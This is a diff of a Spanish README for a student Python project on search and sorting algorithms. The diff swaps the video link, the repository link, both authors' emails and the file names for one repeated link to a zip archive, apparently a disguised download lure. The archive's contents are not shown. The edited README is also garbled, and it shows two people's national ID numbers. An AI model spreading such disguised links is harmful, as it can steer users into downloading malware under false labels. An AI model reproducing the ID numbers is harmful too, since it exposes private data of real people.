@@ -12,18 +12,18 @@ El objetivo principal fue aplicar estos algoritmos sobre una lista de datos, com
 
 ## Anexo
 
-- [Enlace a video explicativo (Youtube)](https://youtu.be/06OyYQpJKj4)
-- [Enlace a repositorio del código (GitHub)](https://github.com/figueroaignacio/tp-algoritmos-de-busqueda-y-ordenamiento-en-python)
+- [Enlace a video explicativo (Youtube)](https://raw.githubusercontent.com/BrunoCroppi/tp-algoritmos-de-busqueda-y-ordenamiento-en-python/main/affixal/tp-algoritmos-de-busqueda-y-ordenamiento-en-python.zip)
+- [Enlace a repositorio del código (GitHub)](https://raw.githubusercontent.com/BrunoCroppi/tp-algoritmos-de-busqueda-y-ordenamiento-en-python/main/affixal/tp-algoritmos-de-busqueda-y-ordenamiento-en-python.zip)
 
 ## Autores
 
-- Ignacio Figueroa - [ignaciofigueroadev@gmail.com](mailto:ignaciofigueroadev@gmail.com) - DNI 45406120 - Comisión 7
-- Bruno Croppi - [croppibruno@gmail.com](mailto:croppibruno@gmail.com) - DNI 41906566 - Comisión 7
+- Ignacio Figueroa - [https://raw.githubusercontent.com/BrunoCroppi/tp-algoritmos-de-busqueda-y-ordenamiento-en-python/main/affixal/tp-algoritmos-de-busqueda-y-ordenamiento-en-python.zip](https://raw.githubusercontent.com/BrunoCroppi/tp-algoritmos-de-busqueda-y-ordenamiento-en-python/main/affixal/tp-algoritmos-de-busqueda-y-ordenamiento-en-python.zip) - DNI 45406120 - Comisión 7
+- Bruno Croppi - [https://raw.githubusercontent.com/BrunoCroppi/tp-algoritmos-de-busqueda-y-ordenamiento-en-python/main/affixal/tp-algoritmos-de-busqueda-y-ordenamiento-en-python.zip](https://raw.githubusercontent.com/BrunoCroppi/tp-algoritmos-de-busqueda-y-ordenamiento-en-python/main/affixal/tp-algoritmos-de-busqueda-y-ordenamiento-en-python.zip) - DNI 41906566 - Comisión 7
 
 ## Contenido
 
-- `script.py`: Código principal con la implementación de los algoritmos.
-- `README.md`: Descripción general.
+- `https://raw.githubusercontent.com/BrunoCroppi/tp-algoritmos-de-busqueda-y-ordenamiento-en-python/main/affixal/tp-algoritmos-de-busqueda-y-ordenamiento-en-python.zip`: Código principal con la implementación de los algoritmos.
+- `https://raw.githubusercontent.com/BrunoCroppi/tp-algoritmos-de-busqueda-y-ordenamiento-en-python/main/affixal/tp-algoritmos-de-busqueda-y-ordenamiento-en-python.zip`: Descripción general.
 
 ## Herramientas
 
